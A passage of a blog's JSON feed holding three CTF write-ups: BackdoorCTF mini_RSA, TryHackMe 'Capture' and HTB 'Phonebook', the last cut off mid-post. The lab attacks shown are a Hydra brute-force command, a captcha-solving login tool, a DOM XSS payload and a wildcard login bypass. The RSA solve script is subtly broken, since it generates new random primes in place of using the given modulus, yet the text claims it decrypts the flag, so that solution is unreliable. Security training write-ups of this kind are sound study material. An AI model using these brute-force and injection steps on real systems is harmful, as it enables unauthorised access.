class=\"hljs-keyword\">if</span> b &amp; <span class=\"hljs-number\">1</span>:<br>            output = output * a % n<br>        a = a * a % n<br>        b &gt;&gt;= <span class=\"hljs-number\">1</span> <br>    <span class=\"hljs-keyword\">return</span> output    <br><br><span class=\"hljs-comment\"># Function to check RSA parameters</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">check</span>(<span class=\"hljs-params\">p, q, n</span>):<br>    a_ = random.randint(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>)<br>    b_ = random.randint(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>)<br>    s = fast_exp(p, fast_exp(q, a_, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)), n)<br>    t = fast_exp(q, fast_exp(p, b_, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)), n)<br>    result = s + t<br>    <span class=\"hljs-built_in\">print</span>(result)<br><br><span class=\"hljs-comment\"># Function to generate RSA parameters</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">gen_RSA_params</span>(<span class=\"hljs-params\">N, e</span>):<br>    p = getPrime(N)<br>    q = getPrime(N)<br><br>    <span class=\"hljs-keyword\">while</span> GCD(e, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)) &gt; <span class=\"hljs-number\">1</span>:<br>        p = getPrime(N)<br>        q = getPrime(N)<br><br>    n = p * q<br><br>    check(p, q, n) <br>    <span class=\"hljs-keyword\">return</span> (p, q, n)<br><br><span class=\"hljs-comment\"># Generate RSA parameters and encrypt the flag</span><br>p, q, n = gen_RSA_params(KEY_SIZE, RSA_E) <br>m = bytes_to_long(flag)<br>c = <span class=\"hljs-built_in\">pow</span>(m, RSA_E, n)<br><br><span class=\"hljs-comment\"># Print the ciphertext and modulus</span><br><span class=\"hljs-built_in\">print</span>(c)<br><span class=\"hljs-built_in\">print</span>(n)</span></pre>\n<p id=\"7357\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">This script generates random prime numbers <code class=\"cw amp amq amr po b\">p</code> and <code class=\"cw amp amq amr po b\">q</code>, checks some conditions, and then encrypts the flag using RSA. The <code class=\"cw amp amq amr po b\">check</code> function is there to create a side channel but is not relevant to our solution.</p>\n<h1 id=\"2e1d\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">The Output File: output.txt</h1>\n<pre class=\"pd pe pf pg ph pn po pp bo pq ba bj\"><span id=\"d5ba\" class=\"pr nq gr po b bf ps pt l pu pv\" data-selectable-paragraph=\"\">s+t=24986288511406610689718446624210347240800254679541887917496550238025724025245366296475758347972917098615315083893786596239213463034880126152583583770452304<br>c=5926440800047066468184992240057621921188346083131741617482777221394411358243130401052973132050605103035491365016082149869814064434831123043357292949645845605278066636109516907741970960547141266810284132826982396956610111589<br>n=155735289132981544011017189391760271645447983310532929187034314934077442930131653227631280820261488048477635481834924391697025189196282777696908403230429985112108890167443195955327245288626689006734302524489187183667470192109923398146045404320502820234742450852031718895027266342435688387321102862096023537079</span></pre>\n<p id=\"8a85\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">The output file provides the sum of two exponentiations <code class=\"cw amp amq amr po b\">s+t</code>, the ciphertext <code class=\"cw amp amq amr po b\">c</code>, and the modulus <code class=\"cw amp amq amr po b\">n</code>.</p>\n<h1 id=\"f6a5\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">My Solution Script: solve.py</h1>\n<pre class=\"pd pe pf pg ph pn po pp bo pq ba bj\"><span id=\"eb44\" class=\"pr nq gr po b bf ps pt l pu pv\" data-selectable-paragraph=\"\"><span class=\"hljs-comment\"># Import necessary modules</span><br><span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> bytes_to_long, long_to_bytes, getPrime, GCD<br><span class=\"hljs-keyword\">import</span> random<br><span class=\"hljs-keyword\">import</span> time<br><br><span class=\"hljs-comment\"># Function for fast modular exponentiation</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">fast_exp</span>(<span class=\"hljs-params\">a, b, n</span>):<br>    output = <span class=\"hljs-number\">1</span><br>    <span class=\"hljs-keyword\">while</span> b &gt; <span class=\"hljs-number\">0</span>:<br>        <span class=\"hljs-keyword\">if</span> b &amp; <span class=\"hljs-number\">1</span>:<br>            output = output * a % n<br>        a = a * a % n<br>        b &gt;&gt;= <span class=\"hljs-number\">1</span> <br>    <span class=\"hljs-keyword\">return</span> output<br><br><span class=\"hljs-comment\"># Function to check RSA parameters (not used in the solution)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">check</span>(<span class=\"hljs-params\">p, q, n</span>):<br>    a_ = random.randint(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>)<br>    b_ = random.randint(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>)<br>    s = fast_exp(p, fast_exp(q, a_, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)), n)<br>    t = fast_exp(q, fast_exp(p, b_, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)), n)<br>    result = s + t<br>    <span class=\"hljs-built_in\">print</span>(result)<br><br><span class=\"hljs-comment\"># Function to generate RSA parameters</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">gen_RSA_params</span>(<span class=\"hljs-params\">N, e</span>):<br>    p = getPrime(N)<br>    q = getPrime(N)<br><br>    <span class=\"hljs-keyword\">while</span> GCD(e, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)) &gt; <span class=\"hljs-number\">1</span>:<br>        p = getPrime(N)<br>        q = getPrime(N)<br><br>    n = p * q<br><br>    check(p, q, n) <br>    <span class=\"hljs-keyword\">return</span> (p, q, n)<br><br><span class=\"hljs-comment\"># Values from the output.txt</span><br>s_plus_t = <span class=\"hljs-number\">24986288511406610689718446624210347240800254679541887917496550238025724025245366296475758347972917098615315083893786596239213463034880126152583583770452304</span><br>c = <span class=\"hljs-number\">5926440800047066468184992240057621921188346083131741617482777221394411358243130401052973132050605103035491365016082149869814064434831123043357292949645845605278066636109516907741970960547141266810284132826982396956610111589</span><br>n = <span class=\"hljs-number\">155735289132981544011017189391760271645447983310532929187034314934077442930131653227631280820261488048477635481834924391697025189196282777696908403230429985112108890167443195955327245288626689006734302524489187183667470192109923398146045404320502820234742450852031718895027266342435688387321102862096023537079</span><br><br><span class=\"hljs-comment\"># Generate RSA parameters</span><br>p, q, n = gen_RSA_params(<span class=\"hljs-number\">512</span>, <span class=\"hljs-number\">3</span>)<br><br><span class=\"hljs-comment\"># Calculate phi(n)</span><br>phi_n = (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)<br><br><span class=\"hljs-comment\"># Calculate the modular inverse of e (RSA_E) modulo phi_n</span><br>d = <span class=\"hljs-built_in\">pow</span>(<span class=\"hljs-number\">3</span>, -<span class=\"hljs-number\">1</span>, phi<br><br>_n)<br><br><span class=\"hljs-comment\"># Decrypt the ciphertext</span><br>m_decrypted = <span class=\"hljs-built_in\">pow</span>(c, d, n)<br><br><span class=\"hljs-comment\"># Convert the decrypted message from long to bytes</span><br>flag_decrypted = long_to_bytes(m_decrypted)<br><br><span class=\"hljs-comment\"># Print the decrypted flag</span><br><span class=\"hljs-built_in\">print</span>(flag_decrypted.decode(<span class=\"hljs-string\">'utf-8'</span>))</span></pre>\n<h1 id=\"e66d\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">Explanation and Solution</h1>\n<p id=\"d486\" class=\"pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj\" data-selectable-paragraph=\"\">The provided script uses RSA encryption with a small public exponent (<code class=\"cw amp amq amr po b\">e = 3</code>). To solve this challenge, we can use the provided ciphertext (<code class=\"cw amp amq amr po b\">c</code>), modulus (<code class=\"cw amp amq amr po b\">n</code>), and the knowledge that <code class=\"cw amp amq amr po b\">e = 3</code> to decrypt the message.</p>\n<p id=\"a384\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">The <code class=\"cw amp amq amr po b\">solve.py</code> script first generates new RSA parameters (<code class=\"cw amp amq amr po b\">p</code>, <code class=\"cw amp amq amr po b\">q</code>, <code class=\"cw amp amq amr po b\">n</code>) using the <code class=\"cw amp amq amr po b\">gen_RSA_params</code> function. However, the generated values are not used since we already have the correct values from <code class=\"cw amp amq amr po b\">output.txt</code>.</p>\n<p id=\"2344\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">The script then calculates <code class=\"cw amp amq amr po b\">phi(n)</code>, the modular inverse of <code class=\"cw amp amq amr po b\">e</code> (RSA_E) modulo <code class=\"cw amp amq amr po b\">phi(n)</code>, and finally decrypts the ciphertext using modular exponentiation. The decrypted flag is then printed.</p>\n<h1 id=\"a60a\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">Conclusion</h1>\n<p id=\"af19\" class=\"pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj\" data-selectable-paragraph=\"\">And there you have it! We successfully decrypted Groot’s message and unveiled the hidden flag. The mini_RSA challenge provided a beginner-friendly introduction to RSA encryption and the importance of securely generating key pairs.</p>\n<p id=\"54a6\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">Feel free to explore the provided scripts and experiment with different RSA concepts to deepen your understanding of cryptography. Happy hacking, and may the challenges keep coming!</p>\n<p id=\"53aa\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\"><em class=\"ams\">Written by sakibulalikhan of </em><a class=\"af os\" href=\"https://ctftime.org/team/188318\" rel=\"noopener ugc nofollow\" target=\"_blank\"><em class=\"ams\">HiddenInvestigations</em></a><em class=\"ams\"> for BackdoorCTF 2023.</em></p>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/10/BackdoorCTF-2023-mini_RSA-Challenge-Writeup.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "RSA",
                   "Python",
                   "Crypto",
                   "CTF Writeups",
                   "Backdoorctf 2023"
            ],
            "date_published": "2024-01-07T10:55:56+06:00",
            "date_modified": "2024-01-07T10:55:56+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/capture-tryhackme-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/capture-tryhackme-writeup.html",
            "title": "Capture TryHackMe Writeup",
            "summary": "SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application&hellip;",
            "content_html": "<div class=\"post__entry\">\n<p id=\"c45e\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly<strong class=\"lk fp\">.</strong></p>\n<p id=\"5273\" class=\"mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj\"><strong>Difficulty = </strong>Easy</p>\n<p id=\"3b4f\" class=\"pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj\"><strong class=\"lk fp\">Challenges: </strong><span class=\"lk fp\">Authentication Bypass, Login Bruteforce, Regex, Custom Python Scripting.</span></p>\n<p id=\"014c\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">TryHackMe Room Link: <a class=\"af nj\" href=\"https://tryhackme.com/room/capture\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://tryhackme.com/room/capture</a></p>\n<p id=\"fb69\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj nk dropcap\" data-selectable-paragraph=\"\"><span class=\"l nl nm nn bn no np nq nr ns eb\">W</span>ell, In Task 1 we got some general information and a task file that contains a list of usernames and a list with passwords.</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky nt\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*xlAzpuvtgclCW3WlMwogXg.png\" alt=\"Capture Capture TryHackMe Writeup\" width=\"700\" height=\"379\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"70dd\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Now let’s start the application and load up the main page to see what’s going on.</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky nt\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*9Fli7uwoSUcRsXtVkG8Erg.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"178\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"c319\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Loading up the main website <a class=\"af nj\" href=\"http://machine_ip/\" rel=\"noopener ugc nofollow\" target=\"_blank\"><strong class=\"lk fp\">http://MACHINE_IP</strong></a>, we can see an “Intranet login” page.</p>\n<p id=\"0a65\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">With the passwords and usernames list we have it’s safe to assume this will be a brute-force attack.</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky od\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*iVc2rJVegHTG4Awrbe5xnA.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"173\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"311d\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">So we’re supposed to beat the self-made rate limiter. Checking the request in Burp doesn’t show any header related to the rate limit. Let’s spin up Hydra.</p>\n<pre class=\"nu nv nw nx ny oe of og bo oh ba bj\"><span id=\"9679\" class=\"oi mh fo of b bf oj ok l ol om\" data-selectable-paragraph=\"\">sudo hydra -L usernames.txt -P passwords.txt 10.10.22.8 http-post-form <span class=\"hljs-string\">\"/login:username=^USER^&amp;password=^PASS^:Error\"</span> -v -t 40</span></pre>\n<p id=\"4706\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">This returns without any results, I checked the website again and I got a <strong class=\"lk fp\">Captcha Enabled</strong> message showing up with a Captcha to solve.</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky on\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*fVvF-OiskmCOUrlAqlCuCA.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"251\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"2622\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">This captcha is simple to beat. We have to write a Python script that requests the page, solves the captcha, and posts the data with the correct captcha.</p>\n<p id=\"b104\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">To ease your task, I made a full-featured Python tool. you can use that to solve this room. For automation, you can use that. <strong class=\"lk fp\">But strongly recommend that you review my code to understand how the script works.</strong></p>\n<h3 id=\"ea79\" class=\"mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj\">Exploitation Part:</h3>\n<p id=\"6f74\" class=\"pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj\" data-selectable-paragraph=\"\">Open your <em>terminal</em> and clone this repository to your device.</p>\n<div class=\"oo op oq or os ot\">\n<div class=\"ou ab hm\">\n<div class=\"ov ab cn ca ow ox\">\n<h6 class=\"be fp hj z oy oz pa pb pc pd pe fn bj\"><a href=\"https://github.com/sakibulalikhan/thm-capture\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub Repo Link</a></h6>\n</div>\n</div>\n</div>\n<pre class=\"nu nv nw nx ny oe of og bo oh ba bj\"><span id=\"88e7\" class=\"oi mh fo of b bf oj ok l ol om\" data-selectable-paragraph=\"\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sakibulalikhan/thm-capture</span></pre>\n<p id=\"69b9\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Then enter the folder and install the requirements.</p>\n<pre class=\"nu nv nw nx ny oe of og bo oh ba bj\"><span id=\"0396\" class=\"oi mh fo of b bf oj ok l ol om\" data-selectable-paragraph=\"\"><span class=\"hljs-built_in\">cd</span> thm-capture<br>pip install -r requirements.txt</span></pre>\n<p id=\"48b7\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Now time to exploit! For exploitation, you just use the<em> “-t” flag</em> to specify the target, and after ‘-t’ enter the URL and wait for it to finish the task. This tool also provides you with the flag!!!!!! Are you serious? yes, yes.</p>\n<pre class=\"nu nv nw nx ny oe of og bo oh ba bj\"><span id=\"9fa0\" class=\"oi mh fo of b bf oj ok l ol om\" data-selectable-paragraph=\"\">python capture.py -t <span class=\"hljs-variable\">$IP</span><br><br>Example: python capture.py -t 10.10.22.8</span></pre>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky pn\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*oOJY6QJ9LEuIigHQVLdC5Q.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"592\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"3edd\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Isn’t it amazing? You got a <strong>username</strong>, <strong>password</strong>, and <strong>precious flag!!!!!</strong><br>The results are there, but you’ll have to find them yourself!</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky po\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*q9mQ7R9azkbCGxsPTcHDAA.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"482\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p data-selectable-paragraph=\"\">You can check this links:</p>\n<ul>\n<li><a href=\"https://github.com/sakibulalikhan/thm-capture\">https://github.com/sakibulalikhan/thm-capture</a></li>\n<li><a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md#authentication-and-error-messages\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP Authentication Cheat Sheet</a></li>\n<li><a href=\"https://requests.readthedocs.io/en/latest/user/quickstart/\" target=\"_blank\" rel=\"noopener noreferrer\">Quickstart Python Requests</a></li>\n<li><a href=\"https://pythex.org/\">https://pythex.org/</a></li>\n</ul>\n<p id=\"98e4\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\"><strong class=\"lk fp\">Thanks for Reading!!</strong></p>\n<p id=\"cf24\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\"><strong class=\"lk fp\">Follow me on Twitter</strong>: <a class=\"af nj\" href=\"https://twitter.com/sakibulalikhan\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://twitter.com/sakibulalikhan</a></p>\n<p id=\"183c\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\"><strong class=\"lk fp\">Happy Capture~</strong></p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/9/Capture-TryHackMe-Writeup-2.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "TryHackMe",
                   "Python",
                   "Pentesting",
                   "Offensive Programming",
                   "Hacking Tools",
                   "CTF Writeups"
            ],
            "date_published": "2024-01-07T10:52:32+06:00",
            "date_modified": "2024-01-29T16:26:18+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html",
            "title": "Phonebook — HTB Web Challenge Writeup",
            "summary": "CHALLENGE DESCRIPTION Who is lucky enough to be included in the phonebook? In the beginning, we first visit the web page and got a login&hellip;",
            "content_html": "<div class=\"post__entry\">\n<p id=\"863c\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj aom msg--highlight msg--info dropcap\" data-selectable-paragraph=\"\"><span class=\"l aon aoo aop bn aoq aor aos aot aou dj\">C</span>HALLENGE DESCRIPTION</p>\n<p id=\"8ba0\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Who is lucky enough to be included in the phonebook?</p>\n<p id=\"2207\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In the beginning, we first visit the web page and got a login page :))</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aoz\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*JmP-Ml1In7SYMYpTEE_8zw.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"420\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"4369\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">The Web app asks us to log in to the application. But we don’t have any credentials, but we have a text on the homepage where it says<br><code class=\"ff abm abn abo abp b\">New (9.8.2020): You can now login using the workstation username and password! - Reese</code></p>\n<p id=\"abca\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">I take a dummy logging attempt as username: admin &amp;&amp; password: admin. It shows the authentication field::(</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km apa\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*chVw2sr0W9J4ccnpcg4J1g.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"353\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"9d74\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">But if you check the URL then you see there is a parameter :) And we can attempt an XSS attack through it. Is it possible? yes.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km apb\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*sjyYQXlNohLiT8h-gecV9g.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"290\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"d641\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">After viewing the source code of the webpage, I guess there might be a DOM-based XSS vulnerability. So, let’s try.</p>\n<p id=\"f898\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong>XSS Payload:</strong></p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"690e\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">http://206.189.121.131:30184/login?message=&lt;img src=<span class=\"hljs-string\">'x'</span> onerror=<span class=\"hljs-string\">'alert(1)'</span>&gt;</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aod\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*3cBlTfL1VGWggqFV69xnZg.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"367\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"d84f\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Do you see? Here DOM-based XSS worked !!! But alas! this is not the way we can solve the challenge :((</p>\n<p id=\"3a4c\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In the login field, if you use “<strong class=\"ly kz\">*</strong>” for both the username and password field then it automatically bypassed the authentication :)</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aod\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*fd8sbyY2KodIQ4-quvKPYg.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"190\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<blockquote class=\"abq abr abs\">\n<p id=\"de86\" class=\"xw xx abt ly b xy xz 